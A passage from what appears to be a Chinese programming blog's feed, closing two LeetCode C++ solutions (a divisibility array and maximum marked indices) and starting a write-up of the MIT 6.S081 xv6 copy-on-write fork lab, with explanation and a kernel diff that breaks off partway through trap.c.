<p>具体到本题而言，由于 word[0,…,i] 表示的数等于 word[0,…,i - 1] * 10 + word[i]，因此可以上述公式，将 (a * b + c) mod n 转换为 ((a mod n) * b + c) mod n，即 <code>word[0,...,i] mod n = ((word[0,...,i - 1] mod n) * 10 + word[i]) mod n</code> ，而 <code>word[0,...,i - 1] mod n</code> 正好就是上一个大整数作模运算的余数。</p>
<p>因此可以维护一个余数 rem，初始值为 0，每次遍历将 rem 的值根据上述递推公式更新：<code>rem = (rem * 10 + word[i] - &#39;0&#39;) % m</code> ，再判断该余数 rem 是否为 0，加入结果数组中。</p>
<h2 id="解题代码-1"><a href="#解题代码-1" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">public</span><span class="token operator">:</span>
    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">divisibilityArray</span><span class="token punctuation">(</span>string word<span class="token punctuation">,</span> <span class="token keyword">int</span> m<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> res<span class="token punctuation">;</span>
        <span class="token keyword">long</span> <span class="token keyword">long</span> rem <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> word<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            rem <span class="token operator">=</span> <span class="token punctuation">(</span>rem <span class="token operator">*</span> <span class="token number">10</span> <span class="token operator">+</span> word<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token string">'0'</span><span class="token punctuation">)</span> <span class="token operator">%</span> m<span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>rem <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> res<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span> res<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>

<h1 id="求出最多标记下标"><a href="#求出最多标记下标" class="headerlink" title="求出最多标记下标"></a>求出最多标记下标</h1><h2 id="题目链接-2"><a href="#题目链接-2" class="headerlink" title="题目链接"></a>题目链接</h2><p><a href="https://leetcode.cn/problems/find-the-maximum-number-of-marked-indices/">求出最多标记下标</a></p>
<h2 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h2><p>对于本题这种选择满足条件的最大值的问题，可以考虑使用二分答案法。即确定可能答案的最小和最大值，然后进行二分查找，利用 check 函数进行判断，直到找到满足条件的最大值。</p>
<p>显然，可能的最大答案为 n / 2 对（n 个下标），最小答案为 0. 而要判断 k 对下标是否可能，则可以利用贪心的思想，让第 i 个最小的数和第 k - i + 1 个最大的数进行配对，且 i 从 0 到 k（共有 k 组配对），只要该最优匹配下有一组不满足条件（即 2 * nums[i] &gt; nums[j]），则一定无法形成 k 组配对，即最大答案必定小于 k；若这 k 组配对都满足条件，则最大答案必定大于等于 k.</p>
<h2 id="解题代码-2"><a href="#解题代码-2" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">public</span><span class="token operator">:</span>
    <span class="token keyword">int</span> <span class="token function">maxNumOfMarkedIndices</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">sort</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">auto</span> check <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token keyword">bool</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">int</span> p1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> p2 <span class="token operator">=</span> n <span class="token operator">-</span> k <span class="token operator">+</span> p1<span class="token punctuation">;</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span>p2 <span class="token operator">&lt;</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>p1<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">></span> nums<span class="token punctuation">[</span>p2<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
                <span class="token operator">++</span>p1<span class="token punctuation">;</span>
                <span class="token operator">++</span>p2<span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> res <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> left <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> right <span class="token operator">=</span> n <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>left <span class="token operator">&lt;=</span> right<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token punctuation">(</span>left <span class="token operator">+</span> right<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">check</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                res <span class="token operator">=</span> mid<span class="token punctuation">;</span>
                left <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                right <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token number">2</span> <span class="token operator">*</span> res<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>
]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>算法</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>MIT6.s081 2021 Lab Copy on-write</title>
    <url>/2024/08/13/MIT6.s081-2021-Lab%20Copy%20on-write/</url>
    <content><![CDATA[<h1 id="Implement-copy-on-write"><a href="#Implement-copy-on-write" class="headerlink" title="Implement copy-on write"></a>Implement copy-on write</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>xv6 使用 <code>fork()</code> 系统调用创建子进程时，需要将父进程的地址空间进行 <strong>深拷贝</strong> ，即将页表和实际物理空间同时进行拷贝，以实现父进程和子进程地址空间的独立性。但很多时候，如 shell 程序，<code>fork()</code> 通常与 <code>exec()</code> 搭配使用，首先使用 <code>fork()</code> 创建子进程，随后在子进程中使用 <code>exec()</code> 将指定的程序加载到当前地址空间，这样在 <code>fork()</code> 中进行的地址空间拷贝就白白浪费了。</p>
<p>本实现要求实现一个写时复制（copy-on write）的 <code>fork()</code> 系统调用。具体来说，在进行虚拟内存拷贝时，不直接进行物理内存的拷贝，只是将父进程的页表复制给子进程，这样子进程和父进程的每个虚拟页面都指向了同一个物理页面，当子进程需要对某个虚拟页面进行写入时，为了保证父进程和子进程之间的独立性，子进程此时将进行物理内存的分配和拷贝，再进行写入。</p>
<h2 id="实现方案"><a href="#实现方案" class="headerlink" title="实现方案"></a>实现方案</h2><p>根据提示，可以将上述的写时复制的思路用 <strong>异常</strong> 的方式来实现。</p>
<p>首先可以利用页表项的 flags 中的 RSW 位来表示页表项是否为 COW 页，以便后续的异常处理。</p>
<p>修改 <code>uvmcopy()</code> ，将物理页面的分配操作去除，只是进行页表的拷贝，并将父进程和子进程的对应页表项的 PTE_W 置 0（以便在对 COW 页进行写入时陷入内核）、PTE_COW 置 1。</p>
<p>修改 <code>usertrap()</code>，当陷入内核时，内核通过查看 scause 寄存器（见下图）以及页表项的 PTE_W 和 PTE_COW 位，识别到陷入原因是发生在 COW 页上的 store page fault（寄存器值为 15）时，进行对应的异常处理：使用 <code>kalloc()</code> 为其分配物理页面，并将其页表项指向的物理地址数据拷贝到新分配的物理地址下，实现物理内存的拷贝。此时由于页表映射发生了改变，需要插入新的页表项，并删除旧的页表项。在处理了 COW 异常之后，该页面将不再是一个 COW 页，因此需要将 PTE_W 置 1、PTE_COW 置 0。</p>
<p><img src="/2024/08/13/MIT6.s081-2021-Lab%20Copy%20on-write/pf.png"></p>
<p>为了后续实现的方便，可以将 COW 页的判断和 COW 页的异常处理分别封装为两个函数：</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">iscowpage</span><span class="token punctuation">(</span><span class="token class-name">pagetable_t</span> pgtbl<span class="token punctuation">,</span> uint64 va<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>va <span class="token operator">>=</span> MAXVA<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token class-name">pte_t</span> <span class="token operator">*</span>pte <span class="token operator">=</span> <span class="token function">walk</span><span class="token punctuation">(</span>pgtbl<span class="token punctuation">,</span> va<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>pte <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>pte <span class="token operator">&amp;</span> PTE_V<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>pte <span class="token operator">&amp;</span> PTE_U<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token operator">*</span>pte <span class="token operator">&amp;</span> PTE_COW<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">cowfault</span><span class="token punctuation">(</span><span class="token class-name">pagetable_t</span> pagetable<span class="token punctuation">,</span> uint64 va<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    uint64 va0 <span class="token operator">=</span> <span class="token function">PGROUNDDOWN</span><span class="token punctuation">(</span>va<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">pte_t</span><span class="token operator">*</span> pte<span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>pte <span class="token operator">=</span> <span class="token function">walk</span><span class="token punctuation">(</span>pagetable<span class="token punctuation">,</span> va0<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>

    uint64 flags <span class="token operator">=</span> <span class="token function">PTE_FLAGS</span><span class="token punctuation">(</span><span class="token operator">*</span>pte<span class="token punctuation">)</span><span class="token punctuation">;</span>
    uint64 pa0 <span class="token operator">=</span> <span class="token function">PTE2PA</span><span class="token punctuation">(</span><span class="token operator">*</span>pte<span class="token punctuation">)</span><span class="token punctuation">;</span>

    flags <span class="token operator">&amp;=</span> <span class="token punctuation">(</span><span class="token operator">~</span>PTE_COW<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// clear COW bit</span>
    flags <span class="token operator">|=</span> PTE_W<span class="token punctuation">;</span>      <span class="token comment">// set write bit</span>

    uint64 mem<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>mem <span class="token operator">=</span> <span class="token punctuation">(</span>uint64<span class="token punctuation">)</span><span class="token function">kalloc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token function">memmove</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>mem<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>pa0<span class="token punctuation">,</span> PGSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// remove old PTE</span>
    <span class="token function">uvmunmap</span><span class="token punctuation">(</span>pagetable<span class="token punctuation">,</span> va0<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// install new PTE</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mappages</span><span class="token punctuation">(</span>pagetable<span class="token punctuation">,</span> va0<span class="token punctuation">,</span> PGSIZE<span class="token punctuation">,</span> mem<span class="token punctuation">,</span> flags<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token function">kfree</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>mem<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>此外，还需要为每个物理页面引入 <strong>引用计数（reference count）</strong> ，页面创建时计数为 1，每次添加或移除指向该物理地址的页表项都增加或减少引用计数，当引用计数为 0 时释放该物理页面。这里有一个实现的技巧：将引用计数的减少放到 <code>kfree()</code> 中，在 <code>kfree()</code> 中根据引用计数的大小决定是否释放物理页面。</p>
<p>最后，也是很容易忽视的一点，修改 <code>copyout()</code> 以实现对 COW 页的支持。刚开始看到这个提示的时候我很疑惑，前面的工作貌似已经足够实现 COW 了，为什么还要修改 <code>copyout</code>？原来 xv6 对 COW 页进行写时复制都是基于 store page fault，即当尝试写入一个 PTE_W 为 0 的页面时触发异常，导致陷入内核，再由内核进行 COW 页面的异常处理，其中陷入内核的操作是由硬件自动来完成的，具体来说，是在虚实地址转换阶段由 MMU 来完成的。而 <code>copyout()</code> 是运行在内核态下的函数，其地址转换是由内核中的函数 <code>walk()</code> 来实现的，因而不会自动触发异常并交由异常处理程序来处理，而需要手动来完成。由于前面已经将 COW 页的判断和处理封装成了函数，因此对 <code>copyout()</code> 的修改很简单：</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">iscowpage</span><span class="token punctuation">(</span>pagetable<span class="token punctuation">,</span> va0<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">cowfault</span><span class="token punctuation">(</span>pagetable<span class="token punctuation">,</span> va0<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/kernel/defs.h b/kernel/defs.h
index 3564db4..f5a9d8d 100644
<span class="token coord">--- a/kernel/defs.h</span>
<span class="token coord">+++ b/kernel/defs.h</span>
@@ -63,6 +63,7 @@ void            ramdiskrw(struct buf*);
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">void*           kalloc(void);
</span><span class="token prefix unchanged"> </span><span class="token line">void            kfree(void *);
</span><span class="token prefix unchanged"> </span><span class="token line">void            kinit(void);
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">void            incrfcount(void*);
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">// log.c
</span><span class="token prefix unchanged"> </span><span class="token line">void            initlog(int, struct superblock*);
</span></span>@@ -145,6 +146,8 @@ void            trapinit(void);
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">void            trapinithart(void);
</span><span class="token prefix unchanged"> </span><span class="token line">extern struct spinlock tickslock;
</span><span class="token prefix unchanged"> </span><span class="token line">void            usertrapret(void);
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">int             iscowpage(pagetable_t, uint64);
</span><span class="token prefix inserted">+</span><span class="token line">int             cowfault(pagetable_t, uint64);
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">// uart.c
</span><span class="token prefix unchanged"> </span><span class="token line">void            uartinit(void);
</span></span>@@ -170,6 +173,7 @@ uint64          walkaddr(pagetable_t, uint64);
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">int             copyout(pagetable_t, uint64, char *, uint64);
</span><span class="token prefix unchanged"> </span><span class="token line">int             copyin(pagetable_t, char *, uint64, uint64);
</span><span class="token prefix unchanged"> </span><span class="token line">int             copyinstr(pagetable_t, char *, uint64, uint64);
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">pte_t*          walk(pagetable_t, uint64, int);
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">// plic.c
</span><span class="token prefix unchanged"> </span><span class="token line">void            plicinit(void);
</span></span>diff --git a/kernel/kalloc.c b/kernel/kalloc.c
index fa6a0ac..5872b85 100644
<span class="token coord">--- a/kernel/kalloc.c</span>
<span class="token coord">+++ b/kernel/kalloc.c</span>
@@ -14,6 +14,11 @@ void freerange(void *pa_start, void *pa_end);
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">extern char end[]; // first address after kernel.
</span><span class="token prefix unchanged"> </span><span class="token line">                   // defined by kernel.ld.
</span><span class="token prefix unchanged"> </span><span class="token line">
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define PA2RFIDX(pa) ((((uint64)pa) - KERNBASE) / PGSIZE)
</span><span class="token prefix inserted">+</span><span class="token line">
</span><span class="token prefix inserted">+</span><span class="token line">int rfcount[(PHYSTOP - KERNBASE) / PGSIZE];
</span><span class="token prefix inserted">+</span><span class="token line">struct spinlock rflock;
</span><span class="token prefix inserted">+</span><span class="token line">
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">struct run &#123;
</span><span class="token prefix unchanged"> </span><span class="token line">  struct run *next;
</span><span class="token prefix unchanged"> </span><span class="token line">&#125;;
</span></span>@@ -27,6 +32,7 @@ void
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">kinit()
</span><span class="token prefix unchanged"> </span><span class="token line">&#123;
</span><span class="token prefix unchanged"> </span><span class="token line">  initlock(&amp;kmem.lock, "kmem");
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  initlock(&amp;rflock, "rflock");
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  freerange(end, (void*)PHYSTOP);
</span><span class="token prefix unchanged"> </span><span class="token line">&#125;
</span><span class="token prefix unchanged"> </span><span class="token line">
</span></span>@@ -51,15 +57,17 @@ kfree(void *pa)
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  if(((uint64)pa % PGSIZE) != 0 || (char*)pa &lt; end || (uint64)pa >= PHYSTOP)
</span><span class="token prefix unchanged"> </span><span class="token line">    panic("kfree");
</span><span class="token prefix unchanged"> </span><span class="token line">
</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">  // Fill with junk to catch dangling refs.
</span><span class="token prefix deleted">-</span><span class="token line">  memset(pa, 1, PGSIZE);
</span><span class="token prefix deleted">-</span><span class="token line">
</span><span class="token prefix deleted">-</span><span class="token line">  r = (struct run*)pa;
</span><span class="token prefix deleted">-</span><span class="token line">
</span><span class="token prefix deleted">-</span><span class="token line">  acquire(&amp;kmem.lock);
</span><span class="token prefix deleted">-</span><span class="token line">  r->next = kmem.freelist;
</span><span class="token prefix deleted">-</span><span class="token line">  kmem.freelist = r;
</span><span class="token prefix deleted">-</span><span class="token line">  release(&amp;kmem.lock);
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  acquire(&amp;rflock);
</span><span class="token prefix inserted">+</span><span class="token line">  if(--rfcount[PA2RFIDX(pa)] &lt;= 0)&#123;
</span><span class="token prefix inserted">+</span><span class="token line">    memset(pa, 1, PGSIZE);
</span><span class="token prefix inserted">+</span><span class="token line">    // Fill with junk to catch dangling refs.
</span><span class="token prefix inserted">+</span><span class="token line">    r = (struct run*)pa;
</span><span class="token prefix inserted">+</span><span class="token line">    acquire(&amp;kmem.lock);
</span><span class="token prefix inserted">+</span><span class="token line">    r->next = kmem.freelist;
</span><span class="token prefix inserted">+</span><span class="token line">    kmem.freelist = r;
</span><span class="token prefix inserted">+</span><span class="token line">    release(&amp;kmem.lock);
</span><span class="token prefix inserted">+</span><span class="token line">  &#125;
</span><span class="token prefix inserted">+</span><span class="token line">  release(&amp;rflock);
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;
</span><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">// Allocate one 4096-byte page of physical memory.
</span></span>@@ -76,7 +84,15 @@ kalloc(void)
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    kmem.freelist = r->next;
</span><span class="token prefix unchanged"> </span><span class="token line">  release(&amp;kmem.lock);
</span><span class="token prefix unchanged"> </span><span class="token line">
</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">  if(r)
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  if(r) &#123;
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    memset((char*)r, 5, PGSIZE); // fill with junk
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    rfcount[PA2RFIDX(r)] = 1;
</span><span class="token prefix inserted">+</span><span class="token line">  &#125;
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  return (void*)r;
</span><span class="token prefix unchanged"> </span><span class="token line">&#125;
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">
</span><span class="token prefix inserted">+</span><span class="token line">void incrfcount(void* pa)&#123;
</span><span class="token prefix inserted">+</span><span class="token line">  acquire(&amp;rflock);
</span><span class="token prefix inserted">+</span><span class="token line">  ++rfcount[PA2RFIDX(pa)];
</span><span class="token prefix inserted">+</span><span class="token line">  release(&amp;rflock);
</span><span class="token prefix inserted">+</span><span class="token line">&#125;
</span></span>\ No newline at end of file
diff --git a/kernel/riscv.h b/kernel/riscv.h
index 1691faf..a6ba9e7 100644
<span class="token coord">--- a/kernel/riscv.h</span>
<span class="token coord">+++ b/kernel/riscv.h</span>
@@ -343,6 +343,8 @@ sfence_vma()
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#define PTE_W (1L &lt;&lt; 2)
</span><span class="token prefix unchanged"> </span><span class="token line">#define PTE_X (1L &lt;&lt; 3)
</span><span class="token prefix unchanged"> </span><span class="token line">#define PTE_U (1L &lt;&lt; 4) // 1 -> user can access
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define PTE_COW (1L &lt;&lt; 8) // 1 -> is a COW page
</span><span class="token prefix inserted">+</span><span class="token line">
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">// shift a physical address to the right place for a PTE.
</span><span class="token prefix unchanged"> </span><span class="token line">#define PA2PTE(pa) ((((uint64)pa) >> 12) &lt;&lt; 10)
</span></span>diff --git a/kernel/trap.c b/kernel/trap.c
index a63249e..0fb7687 100644
<span class="token coord">--- a/kernel/trap.c</span>
<span class="token coord">+++ b/kernel/trap.c</span>
@@ -29,6 +29,42 @@ trapinithart(void)
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  w_stvec((uint64)kernelvec);
</span><span class="token prefix unchanged"> </span><span class="token line">&#125;
</span><span class="token prefix unchanged"> </span><span class="token line">
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">
</span><span class="token prefix inserted">+</span><span class="token line">int iscowpage(pagetable_t pgtbl, uint64 va) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">  if (va >= MAXVA) return 0;
</span><span class="token prefix inserted">+</span><span class="token line">  pte_t *pte = walk(pgtbl, va, 0);
</span><span class="token prefix inserted">+</span><span class="token line">  if (pte == 0) return 0;
</span><span class="token prefix inserted">+</span><span class="token line">  if ((*pte &amp; PTE_V) == 0) return 0;
</span><span class="token prefix inserted">+</span><span class="token line">  if ((*pte &amp; PTE_U) == 0) return 0;
</span><span class="token prefix inserted">+</span><span class="token line">  return *pte &amp; PTE_COW;
</span><span class="token prefix inserted">+</span><span class="token line">&#125;
</span><span class="token prefix inserted">+</span><span class="token line">
</span><span class="token prefix inserted">+</span><span class="token line">int cowfault(pagetable_t pagetable, uint64 va) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">  uint64 va0 = PGROUNDDOWN(va);
</span><span class="token prefix inserted">+</span><span class="token line">  pte_t* pte;
</span><span class="token prefix inserted">+</span><span class="token line">  if((pte = walk(pagetable, va0, 0)) == 0) return -1;
</span><span class="token prefix inserted">+</span><span class="token line">  
</span><span class="token prefix inserted">+</span><span class="token line">  uint64 flags = PTE_FLAGS(*pte);
</span><span class="token prefix inserted">+</span><span class="token line">  uint64 pa0 = PTE2PA(*pte);
</span><span class="token prefix inserted">+</span><span class="token line">
</span><span class="token prefix inserted">+</span><span class="token line">  flags &amp;= (~PTE_COW); // clear COW bit
</span><span class="token prefix inserted">+</span><span class="token line">  flags |= PTE_W;      // set write bit
</span><span class="token prefix inserted">+</span><span class="token line">
</span><span class="token prefix inserted">+</span><span class="token line">  uint64 mem;
</span><span class="token prefix inserted">+</span><span class="token line">  if ((mem = (uint64)kalloc()) == 0) return -1;
</span><span class="token prefix inserted">+</span><span class="token line">  memmove((void *)mem, (void *)pa0, PGSIZE);
</span><span class="token prefix inserted">+</span><span class="token line">
</span><span class="token prefix inserted">+</span><span class="token line">  // remove old PTE
</span><span class="token prefix inserted">+</span><span class="token line">  uvmunmap(pagetable, va0, 1, 1);
</span><span class="token prefix inserted">+</span><span class="token line">  
</span><span class="token prefix inserted">+</span><span class="token line">  // install new PTE
</span><span class="token prefix inserted">+</span><span class="token line">  if(mappages(pagetable, va0, PGSIZE, mem, flags) &lt; 0)&#123;
</span><span class="token prefix inserted">+</span><span class="token line">    kfree((void *)mem);
</span><span class="token prefix inserted">+</span><span class="token line">    return -1;
</span><span class="token prefix inserted">+</span><span class="token line">  &#125;
</span><span class="token prefix inserted">+</span><span class="token line">  return 0;
</span><span class="token prefix inserted">+</span><span class="token line">&#125;
</span><span class="token prefix inserted">+</span><span class="token line">
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">//
</span><span class="token prefix unchanged"> </span><span class="token line">// handle an interrupt, exception, or system call from user space.
</span><span class="token prefix unchanged"> </span><span class="token line">// called from trampoline.S
